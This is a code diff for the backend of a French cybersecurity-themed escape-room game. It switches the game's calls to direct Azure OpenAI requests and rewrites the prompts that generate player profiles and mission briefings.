+    const systemPrompt = `Tu es un analyste en cybersécurité qui évalue les performances du joueur dans un escape room cybersécurité.
 
-DONNÉES DE LA PARTIE:
-- Temps restant à la fin: ${gameState.timeRemaining} minutes
+Voici les données de la session de jeu:
+- Temps restant: ${gameState.timeRemaining} minutes
 - Budget restant: ${gameState.budget} crédits
 - Salles visitées: ${gameState.visitedRooms.join(', ')}
-- Inventaire final: ${gameState.inventory.map((i: any) => i.name).join(', ')}
-- Puzzles résolus: ${gameState.puzzlesSolved.join(', ')}
+- Énigmes résolues: ${gameState.puzzlesSolved.join(', ')}
 - Événements déclenchés: ${gameState.events.join(', ')}
 
-INSTRUCTIONS:
-Crée un profil professionnel qui analyse les compétences et le style du joueur.
-Structure le profil comme suit:
-1. Profil global (3 lignes max)
-2. Forces (3 bullets max)
-3. Axes de progression (3 bullets max)
-4. Badge final (titre + 1 phrase de justification)
+En fonction de ces données, génère une analyse du profil du joueur qui comprend:
+1. Un résumé global de sa performance
+2. 3-4 points forts identifiés
+3. 2-3 axes d'amélioration
+4. Un badge de compétence obtenu
 
-Ne donne aucun score. Adopte un ton professionnel et orienté progression.
-Sois précis et spécifique dans tes observations, en te basant uniquement sur les données fournies.
-
-Réponds au format JSON suivant sans aucun autre texte autour:
+Réponds uniquement avec un JSON au format:
 {
-  "profileTitle": "Titre du profil",
-  "profileSummary": "Résumé du profil (3 lignes)",
-  "strengths": ["Force 1", "Force 2", "Force 3"],
+  "profileTitle": "Titre pour le profil du joueur",
+  "profileSummary": "Résumé global de la performance (3-4 phrases)",
+  "strengths": ["Force 1", "Force 2", "Force 3", "Force 4"],
   "improvementAreas": ["Axe d'amélioration 1", "Axe d'amélioration 2", "Axe d'amélioration 3"],
   "badge": {
-    "title": "Titre du badge",
-    "description": "Justification du badge"
+    "title": "Nom du badge obtenu",
+    "description": "Description du badge"
   }
 }`;
 
-    // Appel à OpenAI
-    const messages: ChatCompletionRequestMessage[] = [
-      { role: 'system', content: systemPrompt }
-    ];
-    
-    const response = await openAIService.getChatCompletion(messages);
-    
     try {
-      const parsedResponse = JSON.parse(response);
-      return res.json(parsedResponse);
-    } catch (parseError) {
-      console.error("Erreur lors du parsing de la réponse JSON:", parseError);
+      // Appel à l'API Azure OpenAI
+      const response = await axios.post(
+        `${process.env.AZURE_OPENAI_ENDPOINT}/openai/deployments/${process.env.AZURE_OPENAI_DEPLOYMENT}/chat/completions?api-version=${process.env.AZURE_OPENAI_API_VERSION}`,
+        {
+          messages: [
+            { 
+              role: "system", 
+              content: systemPrompt 
+            }
+          ],
+          temperature: 0.7,
+          max_tokens: 1000
+        },
+        {
+          headers: {
+            'Content-Type': 'application/json',
+            'api-key': process.env.AZURE_OPENAI_KEY
+          }
+        }
+      );
+
+      const assistantResponse = response.data.choices[0].message.content;
+      
+      try {
+        const parsedProfile = JSON.parse(assistantResponse);
+        
+        return res.status(200).json(parsedProfile);
+      } catch (parseError: any) {
+        console.error("Erreur lors du parsing de la réponse JSON:", parseError);
+        return res.status(500).json({ 
+          error: "Format de réponse invalide",
+          details: parseError?.message || "Erreur inconnue"
+        });
+      }
+    } catch (error: any) {
+      console.error("Erreur lors de l'appel à l'API OpenAI:", error);
       return res.status(500).json({ 
-        error: "Format de réponse invalide",
-        details: parseError.message
+        error: "Erreur lors de la génération du profil",
+        details: error.message
       });
     }
   } catch (error: any) {
@@ -739,16 +662,23 @@ export async function initializeGame(req: Request, res: Response) {
   try {
     const { difficulty = 'normal' } = req.body;
     
-    // Paramètres initiaux selon la difficulté
-    let initialBudget = 1000;
-    let initialTime = 45;
+    // Configurer les paramètres de jeu en fonction de la difficulté
+    let budget, timeRemaining;
     
-    if (difficulty === 'easy') {
-      initialBudget = 1200;
-      initialTime = 60;
-    } else if (difficulty === 'hard') {
-      initialBudget = 800;
-      initialTime = 30;
+    switch (difficulty) {
+      case 'easy':
+        budget = 1200;
+        timeRemaining = 60;
+        break;
+      case 'hard':
+        budget = 800;
+        timeRemaining = 30;
+        break;
+      case 'normal':
+      default:
+        budget = 1000;
+        timeRemaining = 45;
+        break;
     }
     
     // État initial du jeu
@@ -756,55 +686,77 @@ export async function initializeGame(req: Request, res: Response) {
       currentRoom: 'hub',
       visitedRooms: ['hub'],
       inventory: [],
-      unlockedRooms: ['hub', 'rh', 'it'],  // Au début, seuls le hub, RH et IT sont accessibles
-      budget: initialBudget,
-      timeRemaining: initialTime,
-      events: [],
+      unlockedRooms: ['hub', 'rh', 'it'], // Salles initialement débloquées
+      budget,
+      timeRemaining,
+      events: ['Mission commencée'],
       puzzlesSolved: [],
       difficulty
     };
     
-    // Description de la mission
-    const systemPrompt = `Tu es le narrateur d'un jeu d'escape room cybersécurité appelé "Cyber Escape - Le Pare-feu est tombé". Génère un briefing initial de mission pour le joueur qui incarne un Responsable Cybersécurité devant gérer une crise.
+    // Générer le briefing de mission
+    const systemPrompt = `Tu es le narrateur d'un jeu d'escape room cybersécurité appelé "Cyber Escape - Le Pare-feu est tombé". 
+Tu dois générer un briefing de mission pour le joueur qui est un Responsable Sécurité qui doit faire face à une crise: un malware a infiltré le système et contourné le pare-feu.
 
-Le joueur commence avec:
-- Budget: ${initialBudget} crédits
-- Temps: ${initialTime} minutes
-- Difficulté: ${difficulty}
+La difficulté du jeu est: ${difficulty.toUpperCase()}
 
-INSTRUCTIONS:
-1. Crée un briefing concis mais immersif expliquant la situation d'urgence.
-2. Mentionne qu'un malware inconnu a pénétré le réseau de l'entreprise.
-3. Explique que le joueur dispose d'un budget limité et d'un temps limité avant que le malware ne prenne le contrôle total.
-4. Indique que le joueur commence dans le hub central et peut accéder aux départements RH et IT.
-5. Donne un conseil subtil pour guider les premiers pas.
+Génère un briefing de mission engageant qui comprend:
+1. Un titre accrocheur
+2. Un texte d'introduction de 3-4 phrases qui explique la situation
+3. 3-4 objectifs initiaux pour le joueur
+4. 2-3 conseils pour réussir la mission
 
-Réponds au format JSON suivant sans aucun autre texte autour:
+Réponds uniquement avec un JSON au format:
 {
   "title": "Titre de la mission",
-  "briefing": "Briefing de la mission",
-  "initialObjectives": ["Objectif 1", "Objectif 2", "Objectif 3"],
-  "tips": ["Conseil 1", "Conseil 2"]
+  "briefing": "Texte d'introduction",
+  "initialObjectives": ["Objectif 1", "Objectif 2", "Objectif 3", "Objectif 4"],
+  "tips": ["Conseil 1", "Conseil 2", "Conseil 3"]
 }`;
 
-    // Appel à OpenAI
-    const messages: ChatCompletionRequestMessage[] = [
-      { role: 'system', content: systemPrompt }
-    ];
-    
-    const response = await openAIService.getChatCompletion(messages);
-    
     try {
-      const parsedResponse = JSON.parse(response);
-      return res.json({
-        mission: parsedResponse,
-        gameState
-      });
-    } catch (parseError) {
-      console.error("Erreur lors du parsing de la réponse JSON:", parseError);
+      // Appel à l'API Azure OpenAI
+      const response = await axios.post(
+        `${process.env.AZURE_OPENAI_ENDPOINT}/openai/deployments/${process.env.AZURE_OPENAI_DEPLOYMENT}/chat/completions?api-version=${process.env.AZURE_OPENAI_API_VERSION}`,
+        {
+          messages: [
+            { 
+              role: "system", 
+              content: systemPrompt 
+            }
+          ],
+          temperature: 0.7,
+          max_tokens: 800
+        },
+        {
+          headers: {
+            'Content-Type': 'application/json',
+            'api-key': process.env.AZURE_OPENAI_KEY
+          }
+        }
+      );
+
+      const assistantResponse = response.data.choices[0].message.content;
+      
+      try {
+        const missionBriefing = JSON.parse(assistantResponse);
+        
+        return res.status(200).json({
+          gameState,
+          mission: missionBriefing
+        });
+      } catch (parseError: any) {
+        console.error("Erreur lors du parsing de la réponse JSON:", parseError);
+        return res.status(500).json({ 
+          error: "Format de réponse invalide",
+          details: parseError?.message || "Erreur inconnue"
+        });
+      }
+    } catch (error: any) {
+      console.error("Erreur lors de l'appel à l'API OpenAI:", error);
       return res.status(500).json({ 
-        error: "Format de réponse invalide",
-        details: parseError.message
+        error: "Erreur lors de la génération du briefing de mission",
+        details: error.message
       });
     }
   } catch (error: any) {
